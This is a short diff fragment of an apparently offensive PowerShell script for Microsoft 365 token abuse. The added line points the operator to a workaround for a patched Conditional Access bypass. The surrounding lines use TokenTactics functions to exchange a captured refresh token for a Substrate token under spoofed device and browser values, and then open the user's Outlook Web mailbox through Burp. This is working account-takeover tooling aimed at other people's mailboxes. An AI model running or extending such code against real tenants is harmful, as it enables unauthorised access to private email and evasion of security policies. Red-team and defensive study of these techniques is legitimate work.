@@ -262,7 +262,7 @@ if ($teamsUser) {
 # Open Mailbox in browser with Burp, paste into repeater
 Write-Output "Would you like to open the user's mailbox in the browser?"
 Read-Host "Press enter for instructions or Ctrl+C to cancel"
+Write-Output "Microsoft patched part of the TokenTactics version, use these instruction for a workaround: https://labs.lares.com/owa-cap-bypass/"
 Invoke-RefreshToSubstrateToken -refreshToken $response.refresh_token -domain $domain -Device AndroidMobile -Browser Android
 Invoke-OpenOWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device iPhone -Browser Edge
-
 }
